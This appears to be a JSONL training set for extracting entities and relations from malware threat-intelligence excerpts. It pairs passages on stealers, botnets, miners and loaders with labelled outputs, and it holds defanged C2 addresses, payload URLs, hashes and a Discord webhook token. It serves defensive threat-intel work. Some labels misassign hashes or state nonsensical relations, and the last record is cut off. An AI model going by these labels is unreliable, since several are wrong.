{"instruction": "Peering into the JAR Once executed, the JAR files drop a payload JAR file with a random name and extension. The payload JAR is dropped in a randomly named directory and executed. The threat then runs VBS scripts in order to fingerprint the compromised computer. It also uses the Windows Management Instrumentation (WMI) interface to get details of any installed firewall or security products. The threat then sets registry entries to disable System Restore and set Image File Execution Options for many security products and reversing tools to svchost.exe so that the tools cannot start. It also starts ending processes related to monitoring tools. The threat also connects to its command and control (C&C) server (we observed Adwind connecting with 174[.]127[.]99[.]211 but similar IP address ranges have also been used).", "input": null, "output": "Named Entities: (svchost.exe, file), (command and control (C&C) server, tool), (Adwind, malware), (174[.]127[.]99[.]211, IP)\nRelationships: (command and control (C&C) server, observed connecting with, 174[.]127[.]99[.]211)"}
{"instruction": "Once executed, it sends an HTTP GET request to its Command and Control (C2) server at 79.137.206[.]228 to check in and retrieve the stealer configuration (Figure 6). Note the absence of User-Agent and other typical HTTP headers in this GET request. The semicolon delimited configuration can be interpreted as follows: The first comma-delimited block contains single-digit flags, denoted by 1 (enable) or 0 (disable), to toggle specific stealer features. Based on this configuration, this stealer will collect passwords stored locally (e.g., FTP, SSH), browser cookies and history, Telegram data, and screenshots. Cryptocurrency wallet collection is not enabled. A 32-character hexadecimal string (redacted in Figure 6) is a token generated by the C2 server for use in the subsequent data exfiltration request.", "input": null, "output": "Named Entities: (Command and Control (C2) server, tool), (79.137.206[.]228, IP), (cryptocurrency wallet collection, threat type)\nRelationships: (Command and Control (C2) server, IP, 79.137.206[.]228)"}
{"instruction": "To persist in the victim system, it then adds several scheduled tasks to execute the watchdog dllhost.exe every hour. It does this by executing the following command: The scheduled task names impersonate legitimate Windows-related software to deter casual detection and are as follows: SecurityHealthSystray WindowsDefender WmiPrvSE AntiMalwareServiceExecutable Dllhost MicrosoftEdgeUpd OneDriveService NvStray ActivationRule It also changes the power settings of the system to prevent it from hibernating and sleeping by executing the following command to ensure that its Monero cryptominer component (executed later) is always running while the machine is powered up: The host file is also modified to resolve security product-related domains to the IP 0.0.0.0 to disable communication by security products, e.g., for downloading updates. Lastly, it executes the watchdog component %ProgramData%\\dllhost.exe, which executes the actual cryptominer. Dllhost.exe - Miner watchdog", "input": null, "output": "Named Entities: (watchdog dllhost.exe, file), (Monero cryptominer, tool), (0.0.0.0, IP), (%ProgramData%\\dllhost.exe, file)\nRelationships: No related relations."}
{"instruction": "Moobot includes the following process names of known bots and uses the command \u201ckill -9\u201d to ensure it\u2019s the only one running in the infected device: dvrHelper, Ni**eR69xd, 1337SoraLOADER, Ni**eRd0nks1337, X19I239124UIU, IuYgujeIqn, 14Fa, ccAD, BOGOMIPS, /etc/rc.d/rc.local, g1abc4dmo35hnp2lie0kjf, /dev/FTWDT101_watchdog, /dev/netslink/, PRIVMSG, GETLOCALIP, KILLATTK, Eats8, v[0v, 93OfjHZ2z, GhostWuzHere666, WsGA4@F6F, ACDB, AbAd, iaGv Technical Analysis \u2013 ShellBot ShellBot\u2019s activity began in January and primarily targeted Cacti vulnerability. We collected three ShellBot variants in our traffic capture system. The first is \u201cPowerBots (C) GohacK\u201d from http[:]//80[.]68[.]196[.]6/ff, and the configuration is shown in Figure 9. Its C2 is \u201c49[.]212[.]234[.]206:3303\u201d, and the bot\u2019s process masquerades as \u201c/usr/sbin/sshd\u201d to evade detection. After the communication channel setup, the client waits for a command from the server. There are six commands, shown below:", "input": null, "output": "Named Entities: (Moobot, malware), (ShellBot, malware), (PowerBots (C) GohacK, tool), (http[:]//80[.]68[.]196[.]6/ff, URL), (49[.]212[.]234[.]206:3303, IP)\nRelationships: (PowerBots (C) GohacK, C2, 49[.]212[.]234[.]206:3303)"}
{"instruction": "The commands used in perlbot are listed below. It includes numerous types of flooding attacks and hacking functions. It also includes an exploit enhancement module that gets news from a public website offering exploits and security advisories.\nThe third variant is \u201cB0tchZ 0.2a\u201d from 46[.]101[.]183[.]162/.xx/web. The malicious website is shown in Figure 12. All files on this website are IRC botnets that use the same C2 server, 198[.]98[.]61[.]106:8080. The configuration from the payload that targets vulnerable Cacti servers is shown in Figure 13.", "input": null, "output": "Named Entities: (perlbot, malware), (B0tchZ 0.2a, malware), (46[.]101[.]183[.]162, IP), (198[.]98[.]61[.]106:8080, IP)\nRelationships: (perlbot, use, flooding attacks), (B0tchZ 0.2a, variant of, perlbot), (46[.]101[.]183[.]162, seen in, B0tchZ 0.2a), (198[.]98[.]61[.]106:8080, C2 server of, B0tchZ 0.2a)"}
{"instruction": "AsyncRAT is written in C# language and runs in a .Net Framework environment. Since it is fileless in this phishing campaign, I needed to dump it from the notepad.exe process for deep analysis. Once AsyncRAT starts, it decrypts a group of setting values in its Main() function, as shown in Figure 5.1. The setting values for the captured AsyncRAT indicate: A crypto key was used to decrypt the following setting values: The C2 server host and ports 95.216.102.32:6606, 7707, and 8808 The AsyncRAT version is \u201c0.5.7B\u201d \u201cIf maintain persistence\u201d is set to \u201cfalse\u201d The Mutex object name is \"AsyncMutex_6SI8OkPnk\" \u201cIf support Pastbin\u201d is set to \u201cnull\u201d \u201cIf perform anti-analysis detection\u201d is set to \u201cfalse\u201d \u201cIf make the process critical\u201d is set to \u201cfalse\u201d The Group name is set to \u201cDefault\u201d An HWID is generated using the victim\u2019s hardware information", "input": null, "output": "Named Entities: (AsyncRAT, malware), (notepad.exe, file), (95.216.102.32:6606, IP), (95.216.102.32:7707, IP), (95.216.102.32:8808, IP)\nRelationships: (AsyncRAT, dumped from, notepad.exe), (AsyncRAT, communicates with, 95.216.102.32:6606), (AsyncRAT, communicates with, 95.216.102.32:7707), (AsyncRAT, communicates with, 95.216.102.32:8808)"}
{"instruction": "Initial access Based on our observations over the past two months, these attacks originate from 163[.]123[.]142[.]210 and 185[.]17[.]0[.]19. The attackers have targeted an HTTP URI, \u201cwls-wsat/CoordinatorPortType,\u201d which belongs to an Oracle Weblogic server. The corresponding traffic capture is shown in Figure 2. The attack attempts to download a PowerShell named \u201cbypass.ps1\u201d. The partial PowerShell script, \u201cbypass.ps1,\u201d shown in Figure 3, has had its main code and strings encoded to make it harder to be detected by AntiVirus solutions. After three rounds of adding constants, reversing, and Based64 decoding, we finally uncovered clear text. The first variable, \u201c$c\u201d, contains ScrubCrypt. The detail of this variable will be discussed in the next section. The rest of the variables, from \u201c$d\u201d to \u201c$f\u201d, are for AMSI and ETW evasion, which is executed by \u201ciex\u201d at the end of the attack.", "input": null, "output": "Named Entities: (163[.]123[.]142[.]210, IP), (185[.]17[.]0[.]19, IP)\nRelationships: (163[.]123[.]142[.]210, originate from, attack), (185[.]17[.]0[.]19, originate from, attack)"}
{"instruction": "\nTechnical analysis \u2013 final payload\nWe collected several ScrubCrypt samples in February, and each payload is a little different. On 2/14, ScrubCrypt loads \u201cminer\u201d and invokes the process \u201cexplorer.exe\u201d to start the miner process to server 45[.]142[.]122[.]11:8080, shown in Figures 14 and 15. This IP address and wallet were used for the 8220 Gang attack in January 2023.", "input": null, "output": "Named Entities: (ScrubCrypt, malware), (miner, tool), (explorer.exe, file), (45[.]142[.]122[.]11:8080, IP)\nRelationships: (ScrubCrypt, load, miner), (ScrubCrypt, invoke, explorer.exe)"}
{"instruction": "On 2/16, ScrubCrypt loaded a module also named \u201cbat\u2019, as shown in Figure 20, but the data for its unzip is from its \u201cResources\u201d section. It communicates with the same C2 server, and downloads two files from 163[.]123[.]142[.]210. These files are also compressed PE files named \u201cplugin_3.dll\u201d and \u201cplugin_4.dll\u201d. They are identical to the files from 2/15 and start crypto miner activity using the same configuration, as shown in Figure 21.", "input": null, "output": "Named Entities: (ScrubCrypt, malware), (C2 server, tool), (163[.]123[.]142[.]210, IP), (plugin_3.dll, file), (plugin_4.dll, file)\nRelationships: (ScrubCrypt, communicate with, C2 server), (ScrubCrypt, download, plugin_3.dll), (ScrubCrypt, download, plugin_4.dll), (plugin_3.dll, identical to, plugin_4.dll)"}
{"instruction": "Up through October 2022, one of the C2 servers (176[.]65[.]137[.]5) listed in our Zerobot report historically distributed the Mirai-based SORA variant. It then switched to distributing Zerobot the month after. For example, hxxp://176[.]65[.]137[.]5/bins/zero[.]x86 served a UPX-packed SORA binary in October 2022 (Figure 10), but similar URLs with the zero.{arch} filename were later seen distributing Zerobot instead. The switch from distributing SORA to Zerobot, but using the same campaign filename is interesting as these families do not share a common C2 protocol. The intent behind the switch remains unclear. Apart from Zerobot, we are also highlighting several additional Golang botnets caught by our honeypots.", "input": null, "output": "Named Entities: (C2 servers, tool), (176[.]65[.]137[.]5, IP), (Mirai-based SORA variant, malware), (Zerobot, malware), (hxxp://176[.]65[.]137[.]5/bins/zero[.]x86, URL), (Golang botnets, malware)\nRelationships: (C2 servers, distribute, Mirai-based SORA variant), (C2 servers, distribute, Zerobot), (176[.]65[.]137[.]5, C2 server, Mirai-based SORA variant), (176[.]65[.]137[.]5, C2 server, Zerobot), (hxxp://176[.]65[.]137[.]5/bins/zero[.]x86, distribute, Zerobot), (Zerobot, family, Golang botnets)"}
{"instruction": "In general, for the security plugins it cannot bypass, it only reports them to the C2 server by updating the global status message with information similar to the data it sends during a successful login. But it uses \u201c3GOOD\u201d for the brute force status to indicate that credential validation was skipped. On encountering websites that contain the string \u201c1gb.ru\u201d within the page content, GoTrim also sends the same \u201c3GOOD\u201d brute force status. This appears to be a conscious decision to avoid targeting websites hosted by this provider, but the intent remains unclear. Campaign Updates While searching for other samples related to this campaign, we found a PHP script and binary from September 2022 with different URLs \u201c/selects?param=1\u201d and \u201c/selects?walert=1\u201d on C2 server 89[.]208[.]107[.]12 (Figure 6). The PHP script we detect as PHP/GoTrim!tr.dldr uses the same installation method, with only the download URL varying across the samples we gathered.", "input": null, "output": "Named Entities: (security plugins, tool), (C2 server, tool), (PHP script, tool), (binary, tool), (89[.]208[.]107[.]12, IP), (PHP/GoTrim!tr.dldr, malware)\nRelationships: (security plugins, bypass, C2 server), (C2 server, IP, 89[.]208[.]107[.]12), (PHP script, use, C2 server), (binary, use, C2 server), (PHP/GoTrim!tr.dldr, name, PHP/GoTrim!tr.dldr)"}
{"instruction": "The web shell is a modification of the PhpSpy backdoor and references the author MagicCoder while linking to the (deleted) domain magiccoder.ir. Researching the hacker handle MagicCoder results in references to the Iranian hacking forum Ashiyane as well as defacements by the Iranian hacker group Sun Army.", "input": null, "output": "Named Entities: (PhpSpy, malware), (backdoor, threat type), (magiccoder.ir, Domain), (MagicCoder, tool), (Sun Army, attacker)\nRelationships: (The web shell, modification, PhpSpy), (PhpSpy, is, backdoor), (The web shell, link, magiccoder.ir)"}
{"instruction": "In many cases, the job-themed malware delivered to victims was the commodity loader called GuLoader. GuLoader is a shellcode-based downloader with anti-analysis features. In addition to malicious files, the loader deploys some legitimate binaries as a decoy for its malicious activity. GuLoader was distributed to victims in a self-extracting NSIS executable. This NSIS script decrypts and injects obfuscated shellcode into another process. The process most often observed in the July activity was ieinstal.exe , the Internet Explorer Add-on Installer, but also included aspnet_regbrowsers.exe , the ASP.NET Browser Registration tool. The process for the Internet Explorer Add-on Installer was likely used to download a malicious .NET downloader from URLs such as hxxp://178.73.192[.]15/ca1.exe . Multiple .NET downloaders were found that abused the file transfer service transfer[.]sh to download a file named with an RTF extension. This payload is unknown, but the downloaders are designed to load it as a .NET DLL.", "input": null, "output": "Named Entities: (GuLoader, malware), (NSIS executable, file), (ieinstal.exe, file), (aspnet_regbrowsers.exe, file), (hxxp://178.73.192[.]15/ca1.exe, URL), (transfer[.]sh, Domain)\n\nRelationships: (GuLoader, delivered as, NSIS executable), (GuLoader, observed process, ieinstal.exe), (GuLoader, observed process, ieinstal.exe), (GuLoader, downloaded from, hxxp://178.73.192[.]15/ca1.exe), (GuLoader, abused, transfer[.]sh)"}
{"instruction": "Next, it sets the following registry value: HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\.ptdf\\\"ptdffile\" = \"[file_path_of_the_DLL]\" Loadpoint This is a 32-bit executable with the PDB filename: \"M:\\Project\\database\\10.0.18362\\Form\\Release\\Form.pdb\". (SHA256: 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e) Whenever the sample is executed, it loads the following DLL: \"[file_path_of_the_running_executable]\\FormDll.dll\" It also calls its export: \"DoRVA\". Installation and Update Utility The installation and update utility is a 32-bit PE executable (SHA256: a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221) that shares small but distinctive fragments of code with the Merdoor loader, which is what indicates they are part of the same toolset. Whenever the sample is executed, it attempts to read and delete the following file containing its configuration data: \"[file_directory_of_running_executable]\\res.ini\" Update functionality Next, it checks that: \"\\\\.\\TdiProxy0\" device is available, and That its own process was started with the command-line parameter \"-up\". If both checks pass, the sample attempts to tamper with various antivirus products using the \"\\\\.\\TdiProxy0\" device. For example, it may terminate the processes \"egui.exe\", \"ekrn.exe\", and \"msmpeng.exe\".", "input": null, "output": "Named Entities: (Loadpoint, tool), (Form.pdb, file), (180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e, SHA256), (FormDll.dll, file),  (DoRVA, tool), (a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221,SHA256), (Merdoor loader, tool), (res.ini, file), (TdiProxy0, tool), (egui.exe, file), (ekrn.exe, file), (msmpeng.exe,file)\nRelationships: (Loadpoint, file, Form.pdb), (Form.pdb, hash, 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e), (Form.pdb, load, FormDll.dll), (Form.pdb, call, DoRVA), (DoRVA, hash, a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221), (DoRVA, the same toolset, Merdoor loader), (DoRVA, read and delete, res.ini), (DoRVA, read and delete, \\TdiProxy0), (DoRVA, terminate, egui.exe), (DoRVA, terminate, ekrn.exe), (DoRVA, terminate, msmpeng.exe)"}
{"instruction": "Mac versions \nAt last two macOS versions of the affected software were compromised in a similar fashion. In this case a dynamic library named libffmpeg.dylib was Trojanized. There are at least two variants of this file (SHA256: a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 and fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7) and they seem to relate to different versions of the software. \nThe malicious code is in the InitFunc_0 function of libffmpeg.dylib, it calls _run_avcodec which starts a thread, in this thread it decodes some shellcode with XOR key 0x7A and then will make a http request. \nIt attempts to download a payload from: \nURL: https://msstorageazure[.]com/analysis \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Safari/537.36 \nThe following URLs were embedded in analyzed variants: \nofficestoragebox[.]com/api/biosync \nvisualstudiofactory[.]com/groupcore \nazuredeploystore[.]com/cloud/images \nmsstorageboxes[.]com/xbox \nofficeaddons[.]com/quality \nsourceslabs[.]com/status \nzacharryblogs[.]com/xmlquery \npbxcloudeservices[.]com/network \npbxphonenetwork[.]com/phone \nakamaitechcloudservices[.]com/v2/fileapi \nazureonlinestorage[.]com/google/storage \nmsedgepackageinfo[.]com/ms-webview \nglcloudservice[.]com/v1/status \npbxsources[.]com/queue", "input": null, "output": "Named Entities: (libffmpeg.dylib, file), (a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67, SHA256), (fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7, SHA256), (https://msstorageazure[.]com/analysis, URL), (officestoragebox[.]com/api/biosync, URL), (visualstudiofactory[.]com/groupcore, URL), (azuredeploystore[.]com/cloud/images, URL), (msstorageboxes[.]com/xbox, URL), (officeaddons[.]com/quality, URL), (sourceslabs[.]com/status, URL), (zacharryblogs[.]com/xmlquery, URL), (pbxcloudeservices[.]com/network, URL), (pbxphonenetwork[.]com/phone, URL), (akamaitechcloudservices[.]com/v2/fileapi, URL), (azureonlinestorage[.]com/google/storage, URL), (msedgepackageinfo[.]com/ms-webview, URL), (glcloudservice[.]com/v1/status, URL), (pbxsources[.]com/queue, URL)\nRelationships: (libffmpeg.dylib, hash, a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67), (libffmpeg.dylib, hash, fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7), (libffmpeg.dylib, download payload from, https://msstorageazure[.]com/analysis), (variants, embed, officestoragebox[.]com/api/biosync), (variants, embed, visualstudiofactory[.]com/groupcore), (variants, embed, azuredeploystore[.]com/cloud/images), (variants, embed, msstorageboxes[.]com/xbox), (variants, embed, officeaddons[.]com/quality), (variants, embed, sourceslabs[.]com/status), (variants, embed, zacharryblogs[.]com/xmlquery), (variants, embed, pbxcloudeservices[.]com/network), (variants, embed, pbxphonenetwork[.]com/phone), (variants, embed, akamaitechcloudservices[.]com/v2/fileapi), (variants, embed, azureonlinestorage[.]com/google/storage), (variants, embed, msedgepackageinfo[.]com/ms-webview), (variants, embed,glcloudservice[.]com/v1/status), (variants, embed, pbxsources[.]com/queue)"}
{"instruction": "Current Blackfly toolset The following tools were used in attacks during late 2022 and early 2023: Backdoor.Winnkit SHA256: caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459 SHA256: cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a SHA256: e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596 SHA256: a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac SHA256: 714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196 SHA256: 192ef0dee8df73eec9ee617abe4b0104799f9543a22a41e28d4d44c3ad713284 Rootkit driver known to be associated with Blackfly Credential-dumping tool SHA256: 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c Creates a dump of credentials from lsass.exe in C:\\windows\\temp\\1.bin. Screenshotting tool SHA256: 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4 Screenshots all open windows and saves them as .jpg files. Process-hollowing tool SHA256: 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e Injects shellcode in C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted. The shellcode is a simple \"Hello World\" alert message. SQL tool SHA256: 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d SQL client tool used to query SQL databases. Mimikatz SHA256: b28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c Publicly available credential-dumping tool. ForkPlayground SHA256: a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864 Proof-of-Concept application to create a memory dump of an arbitrary process using the ForkLib. Proxy configuration tool SHA256: 5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f SHA256: d4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee SHA256: f138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f Configures proxy settings by injecting into: C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted.", "input": null, "output": "Named Entities: (Blackfly, tool), (Backdoor.Winnkit, malware), (caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459, SHA256), (cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a, SHA256), (e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596, SHA256), (a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac, SHA256), (714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196, SHA256), (Rootkit driver, tool), (Blackfly, associated with, Rootkit driver), (Credential-dumping tool, tool), ( 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c, SHA256), (Screenshotting tool, tool), ( 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4, SHA256), (Process-hollowing tool, tool), ( 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e, SHA256), (SQL tool, tool), ( 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d, SHA256), (Mimikatz, tool), ( b28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c, SHA256), (ForkPlayground, tool), ( a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864, SHA256), (Proxy configuration tool, tool), ( 5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f, SHA256), ( d4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee, SHA256), ( f138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f, SHA256)\n\nRelationships: (Blackfly, use, Backdoor.Winnkit), (Backdoor.Winnkit, hash, caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459), (Backdoor.Winnkit, hash, cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a), (Backdoor.Winnkit, hash, e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596), (Backdoor.Winnkit, hash, a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac), (Backdoor.Winnkit, hash, 714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196), (Blackfly, use, Rootkit driver), (Rootkit driver, associated with, Blackfly), (Blackfly, use, Credential-dumping tool), (Credential-dumping tool, hash, 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c), (Blackfly, use, Screenshotting tool), (Screenshotting tool, hash, 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4), (Blackfly, use, Process-hollowing tool), (Process-hollowing tool, hash, 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e), (Blackfly, use, SQL tool), (SQL tool, hash, 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d), (Blackfly, use, Mimikatz), (Mimikatz, hash, b28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c), (Blackfly, use, ForkPlayground), (ForkPlayground, hash, a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864), (Blackfly, use, Proxy configuration tool), (Proxy configuration tool, hash, 5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f), (Proxy configuration tool, hash, d4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee), (Proxy configuration tool, hash, f138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f)"}
{"instruction": "As shown in Figure 5, after downloading the RAR archive 2O23-F1LES-S0ft.rar via the URL provided in the YouTube video description, the victim must uncompress the archive with the password \u201c1212,\u201d listed together with the URL, and run the Launcher_S0FT-2O23.exe contained within. The archive also contains multiple unused files and directories, possibly to masquerade as a legitimate installer. A detailed analysis of each component is provided in the following sections. Launcher_S0FT-2O23.exe - Vidar Stealer Launcher_S0FT-2O23.exe is the Vidar infostealer. It is appended with over 1GB of unused bytes, a technique commonly used to bypass antivirus and sandboxes that do not scan files beyond a specific size due to limited CPU and RAM resources. The SHA256 hash of this file is 820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c (original) and e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb (after removing excess bytes).", "input": null, "output": "Named Entities: (Launcher_S0FT-2O23.exe, file), (Vidar Stealer, malware), (820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c, SHA256), (e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb, SHA256)\nRelationships: (Launcher_S0FT-2O23.exe, is, Vidar Stealer), (Launcher_S0FT-2O23.exe, hash of this file, 820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c), (Launcher_S0FT-2O23.exe, hash of this file, e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb)"}
{"instruction": "Vaxa.exe - Miner Installer Vaxa.exe (SHA256: 44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f) is an in-memory loader for an embedded miner downloader payload. It is a 32-bit Windows console application masquerading as a program for performing and displaying the results of some simple math operations (Figure 15). It then proceeds to decrypt the shellcode and payload from its body. The shellcode is provided with the path of the application to inject the payload into before execution is redirected to it (Figure 16). The shellcode uses process hollowing to inject and execute a .NET assembly named Task32Main (SHA256: 5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3) within Regsvcs.exe. Task32Main \u2013 Miner Downloader Task32Main is a .NET downloader and installer for Monero cryptomining components. It provides supporting functionality, such as maintaining persistence and AV evasion. More importantly, it is responsible for installing the watchdog component, which ensures that the miner is kept running in the victim system.", "input": null, "output": "Named Entities: (Vaxa.exe, file), (Miner Installer, malware), (44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f, SHA256), (shellcode, tool), (Task32Main, malware), (5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3, SHA256), (Regsvcs.exe, file), (watchdog, tool)\nRelationships: (Vaxa.exe, is, Miner Installer), (Vaxa.exe, hash, 44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f), (Vaxa.exe, decrypt, shellcode), (shellcode, inject, Task32Main), (Task32Main, hash, 5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3), (Task32Main, within, Regsvcs.exe), (Task32Main, installing, watchdog)"}
{"instruction": "We observed that hxxp://109[.]206[.]243[.]207/ssh/x86_64 started serving Bash shell scripts instead of the usual RapperBot binary for the x64 architecture as early as January 12. These Bash scripts (example hash: 7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f) downloaded and executed separate XMRig crypto miners (example hash: 0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404) and RapperBot binaries, as seen in Figure 4.", "input": null, "output": "Named Entities: (hxxp://109[.]206[.]243[.]207/ssh/x86_64, URL), (RapperBot, malware), (Bash scripts, tool), (7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f, SHA256), (XMRig crypto miner, tool), (0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404, SHA256)\nRelationships: (hxxp://109[.]206[.]243[.]207/ssh/x86_64, servering, Bash scripts), (RapperBot, use, Bash scripts), (Bash scripts, hash, 7f6e0fa785820075a61819ca6b272a239733b770eb8a92a4056cf5d26d89795f), (Bash scripts, download, XMRig crypto miner), (XMRig crypto miner, hash, 0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404)"}
{"instruction": "XMRig is an open-source Monero miner commonly abused by threat actors for cryptojacking. Monero (XMR) is a popular cryptocurrency for illicit mining by threat actors because of its privacy-enhancing features. It is also designed to be more resistant to application-specific integrated circuit (ASIC) miners, which makes it possible to mine profitably with just consumer-grade hardware. In late Jan 2023, FortiGuard Labs collected a significantly larger x64 sample f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa, which used the same C2 server IP and communication protocol. On further analysis, we verified that the bot developers had merged the RapperBot C source code with the C++ code of XMRig Monero miner to create a combined bot client with mining capabilities. Mining Under the Radar", "input": null, "output": "Named Entities: (XMRig, malware), (cryptojacking, threat type), (f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa, SHA256), (RapperBot, malware)\nRelationships: (XMRig, for, cryptojacking), (XMRig, hash, f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa), (XMRig, merged, RapperBot)"}
{"instruction": "Once that victim device receives the C2 server\u2019s packets, it downloads another three files from 79[.]137[.]203[.]156, shown in Figure 18. The first, \u201cminer.bat\u201d, is a ScrubCrypt BAT file. The other two files are compressed PE files: \u201cplugin_3.dll\u201d and \u201cplugin_4.dll\u201d (Figure 19). They exhibit behavior similar to that described in this previous article.", "input": null, "output": "Named Entities: (79[.]137[.]203[.]156, IP), (miner.bat, file), (plugin_3.dll, file), (plugin_4.dll, file)\nRelationships: (malware, link, 79[.]137[.]203[.]156), (malware, download, miner.bat), (malware, download, plugin_3.dll), (malware, download, plugin_4.dll)"}
{"instruction": "When we take a look inside the binary using IDA, we see many strings that raise suspicions. We can also get some clues about the malware behavior by observing these. Some keywords of interest include, \u2018virus\u2019, \u2018wallets\u2019, \u2018browsers\u2019, \u2018login\u2019, and \u2018passwords\u2019.\nBelow we can also see some strings with \u2018.zip\u2019 for several browser names which could be indication of saving the sensitive information as a zip file.\nThe examples in the code shown below are of the browsers that the malware takes an interest in.\nWe also found an interesting URL embedded in the code:\nhxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy\nIt uses a Go package, \u2018dishooks\u2019, which is a Discord webhook API wrapper. Within the URL, we see that it may be related to a \u201cSpidey Bot\u201d malware which is known to steal personal information through Discord.", "input": null, "output": "Named Entities: (Spidey Bot, malware), (hxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy, URL)\nRelationships: 